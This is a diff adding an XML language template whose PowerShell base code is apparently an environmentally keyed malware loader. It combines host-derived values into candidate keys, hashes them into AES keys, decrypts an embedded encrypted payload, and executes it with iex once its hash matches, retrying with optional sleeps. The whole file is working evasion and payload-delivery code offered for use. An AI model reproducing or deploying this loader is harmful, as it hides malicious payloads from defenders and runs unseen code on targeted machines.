@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<language>
+  <name>powershell</name>
+  <extension>ps1</extension>
+  <baseCode>
+function Invoke-EncryptedFunction
+{
+    function Get-SHA512Hash {
+        param($b)
+        return [System.BitConverter]::ToString($script:sha512.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($b))).ToLower() -replace "-",""
+    }
+    
+    function Compare-SHA512Hashes {
+        param($a, $b, $m)
+        $end = $a.Length - $m - 1
+        if((Get-SHA512Hash $($a[0..$end] -join "")) -eq $b) {
+            return $true
+        }
+        else { return $false }
+    }
+
+    function Get-Combos {
+        param($chars)
+        $script:result = @()
+
+        function combos
+        {
+            param($p,$c)
+            if ($c.Length -eq 0) { break }
+            For ($i=0; $i -le $c.Length; $i++) {
+                $script:result += $p + $c[$i]
+                combos "$p$($c[$i])" ($c[($i+1)..$c.Length])
+            }
+        }
+        combos '' $chars -PassThru
+        return $script:result
+    }
+
+    function Get-AESDecrypted {
+        param($b,$c,$i,$h,$m)
+        $e=[System.Text.Encoding]::ASCII
+        $bytes=[System.Convert]::FromBase64String($c)
+        try {
+            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        }
+        catch {
+            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        }
+        $AES.Mode = "CBC"
+        $AES.Key = $e.GetBytes((Get-SHA512Hash $b)[0..31] -join "")
+        $AES.IV = [System.Convert]::FromBase64String($i)
+        try {
+            $decrypted = $AES.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
+        }
+        catch { return }
+        $result = $e.GetString($decrypted)
+        if($(Compare-SHA512Hashes $result $h $m)) {
+            iex($result)
+            break
+        }
+    }
+
+    {{.Functions}}
+
+    function Test-Inputs {
+        param($a,$b)
+        $a | ForEach-Object {
+            $key = "$_$b"
+            Get-AESDecrypted $key.ToLower() "{{.EncryptedBase64}}" "{{.AESIVBase64}}" "{{.PayloadHash}}" {{.MinusBytes}}
+        }
+    }
+    $script:sha512 = New-Object System.Security.Cryptography.SHA512CryptoServiceProvider
+
+	$idx = 0
+	Do {
+		$chains = @("")
+		$combos = @("")
+
+		{{.Callers}}
+
+		$combos = Get-Combos $combos
+		$chains | ForEach-Object {
+			Test-Inputs $combos $_
+		}
+		{{if .Sleep}}
+		$idx++
+		Start-Sleep {{.Sleep}}
+		{{end}}
+	} While ($idx -lt {{.Retries}})
+}
+
+  </baseCode>
+</language>
